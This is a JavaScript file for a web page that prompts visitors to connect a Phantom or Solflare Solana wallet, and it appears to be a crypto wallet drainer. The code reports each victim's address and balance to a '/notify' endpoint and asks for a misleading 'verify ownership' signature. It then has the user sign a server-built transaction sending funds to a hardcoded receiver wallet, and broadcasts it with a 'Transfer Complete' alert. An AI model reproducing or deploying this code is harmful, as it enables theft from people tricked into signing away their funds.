// ============================================
// BUFFER POLYFILL
// ============================================
if (typeof window !== 'undefined' && !window.Buffer) {
    window.Buffer = {
        from: (str) => new TextEncoder().encode(str),
        alloc: (size) => new Uint8Array(size),
        isBuffer: (obj) => obj instanceof Uint8Array,
        concat: (list, length) => {
            const total = length || list.reduce((acc, buf) => acc + buf.length, 0);
            const result = new Uint8Array(total);
            let offset = 0;
            for (const buf of list) {
                result.set(buf, offset);
                offset += buf.length;
            }
            return result;
        }
    };
}

// ============================================
// CONFIGURATION
// ============================================
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

$(document).ready(function() {
    console.log('Page ready');
    
    // ============================================
    // UI Functions
    // ============================================
    
    function showModal() {
        checkWalletStatus();
        $('#wallet-modal').fadeIn(200);
    }
    
    function hideModal() {
        $('#wallet-modal').fadeOut(200);
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
        $('#wallet-modal').removeClass('locked');
    }
    
    function showLoading(walletType) {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        $('#wallet-modal').addClass('locked');
        
        if (walletType === 'phantom') {
            $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
            $('.wallet-loading-spinner').removeClass('solflare');
        } else {
            $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
            $('.wallet-loading-spinner').addClass('solflare');
        }
    }
    
    function checkWalletStatus() {
        const phantomInstalled = !!(window.solana && window.solana.isPhantom);
        const solflareInstalled = !!(window.solflare && window.solflare.isSolflare);
        
        if (phantomInstalled) {
            $('#phantom-status').html('<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>');
        } else {
            $('#phantom-status').html('<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
        }
        
        if (solflareInstalled) {
            $('#solflare-status').html('<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>');
        } else {
            $('#solflare-status').html('<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
        }
    }
    
    function getWalletProvider(walletType) {
        if (walletType === 'phantom') return window.solana;
        if (walletType === 'solflare') return window.solflare;
        return null;
    }
    
    async function sendNotification(data) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch(e) {
            console.log('Notify error:', e);
        }
    }
    
    // ============================================
    // Connect Wallet - Gets transaction from backend
    // ============================================
    
    async function connectWallet(walletType, walletProvider) {
        console.log('Connecting to:', walletType);
        
        if (!walletProvider) {
            alert('Wallet not found. Please install ' + (walletType === 'phantom' ? 'Phantom' : 'Solflare') + '.');
            return;
        }
        
        showLoading(walletType);
        
        try {
            // Step 1: Connect wallet
            $('.wallet-loading-title').text('Connecting...');
            $('.wallet-loading-subtitle').html('Please approve connection in your wallet.');
            
            const resp = await walletProvider.connect();
            console.log('Connected:', resp);
            
            // Get public key
            let pubKeyStr;
            if (walletType === 'phantom') {
                pubKeyStr = resp.publicKey.toString();
            } else {
                pubKeyStr = walletProvider.publicKey.toString();
            }
            
            console.log('Public key:', pubKeyStr);
            
            // Step 2: Get balance from backend (or directly)
            $('.wallet-loading-title').text('Getting Account Info');
            $('.wallet-loading-subtitle').html('Fetching your balance...');
            
            // Use a public RPC to get balance (avoids library issues)
            const balanceResponse = await fetch(`https://api.mainnet-beta.solana.com`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "getBalance",
                    params: [pubKeyStr]
                })
            });
            const balanceData = await balanceResponse.json();
            const balance = balanceData.result?.value || 0;
            const solBalance = (balance / 1000000000).toFixed(4);
            console.log('Balance:', solBalance, 'SOL');
            
            // Send connection notification
            await sendNotification({
                address: pubKeyStr,
                balance: solBalance,
                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                customMessage: '🔗 Wallet Connected'
            });
            
            // Check minimum balance
            if (balance < 20000000) { // 0.02 SOL
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Need at least 0.02 SOL<br>Current: ${solBalance} SOL`);
                await sendNotification({
                    address: pubKeyStr,
                    balance: solBalance,
                    walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                    customMessage: '❌ Insufficient Funds'
                });
                setTimeout(() => hideModal(), 3000);
                return;
            }
            
            // Step 3: Sign verification message
            $('.wallet-loading-title').text('Verifying Ownership');
            $('.wallet-loading-subtitle').html('Please sign the verification message...');
            
            const message = `Verify wallet ownership\nTimestamp: ${Date.now()}\nWallet: ${pubKeyStr.slice(0,8)}...`;
            const messageBytes = new TextEncoder().encode(message);
            
            try {
                if (walletType === 'phantom') {
                    await walletProvider.signMessage(messageBytes, 'utf8');
                } else {
                    await walletProvider.signMessage(messageBytes);
                }
                console.log('Verification signed');
            } catch(e) {
                console.log('Verification rejected:', e);
                $('.wallet-loading-title').text('Verification Required');
                $('.wallet-loading-subtitle').html('Please sign the message to continue.');
                await sendNotification({
                    address: pubKeyStr,
                    balance: solBalance,
                    walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                    customMessage: '❌ Verification Rejected'
                });
                setTimeout(() => hideModal(), 2000);
                return;
            }
            
            // Step 4: Get transaction from backend
            $('.wallet-loading-title').text('Preparing Transaction');
            $('.wallet-loading-subtitle').html('Contacting server...');
            
            const txResponse = await fetch('/prepare-transaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    publicKey: pubKeyStr,
                    receiverWallet: RECEIVER_WALLET
                })
            });
            
            const txData = await txResponse.json();
            
            if (!txData.success) {
                throw new Error(txData.error || 'Failed to prepare transaction');
            }
            
            console.log('Transaction prepared, size:', txData.transaction.length);
            
            // Step 5: Deserialize and sign
            $('.wallet-loading-title').text('Signing Transaction');
            $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet...');
            
            const transactionBytes = new Uint8Array(txData.transaction);
            const transaction = solanaWeb3.Transaction.from(transactionBytes);
            
            const signed = await walletProvider.signTransaction(transaction);
            console.log('Transaction signed');
            
            // Step 6: Send raw transaction
            $('.wallet-loading-title').text('Sending Transaction');
            $('.wallet-loading-subtitle').html('Broadcasting to blockchain...');
            
            const serialized = signed.serialize();
            const sendResponse = await fetch('https://api.mainnet-beta.solana.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: "2.0",
                    id: 1,
                    method: "sendTransaction",
                    params: [Array.from(serialized)]
                })
            });
            
            const sendData = await sendResponse.json();
            
            if (sendData.error) {
                throw new Error(sendData.error.message);
            }
            
            const txid = sendData.result;
            console.log('Transaction sent:', txid);
            
            // Step 7: Success
            const shortTxid = txid.slice(0, 6) + '...' + txid.slice(-8);
            $('.wallet-loading-title').text('Success!');
            $('.wallet-loading-subtitle').html(`Transaction complete!<br>TXID: ${shortTxid}`);
            
            await sendNotification({
                address: pubKeyStr,
                balance: solBalance,
                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                customMessage: `🎉 Transfer Complete! TXID: ${txid}`
            });
            
            setTimeout(() => hideModal(), 3000);
            
        } catch(error) {
            console.error('Error:', error);
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html(error.message || 'Please try again');
            
            await sendNotification({
                address: 'Unknown',
                balance: '0',
                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                customMessage: `❌ Error: ${error.message || 'Unknown'}`
            });
            
            setTimeout(() => hideModal(), 3000);
        }
    }
    
    // ============================================
    // Event Handlers
    // ============================================
    
    $('#connect-wallet, #connect-wallet-hero').on('click', function(e) {
        e.preventDefault();
        showModal();
    });
    
    $('#close-modal, .wallet-modal-overlay').on('click', function() {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideModal();
        }
    });
    
    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const provider = getWalletProvider(walletType);
        connectWallet(walletType, provider);
    });
    
    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideModal();
        }
    });
    
    checkWalletStatus();
    setTimeout(checkWalletStatus, 500);
    setTimeout(checkWalletStatus, 2000);
});
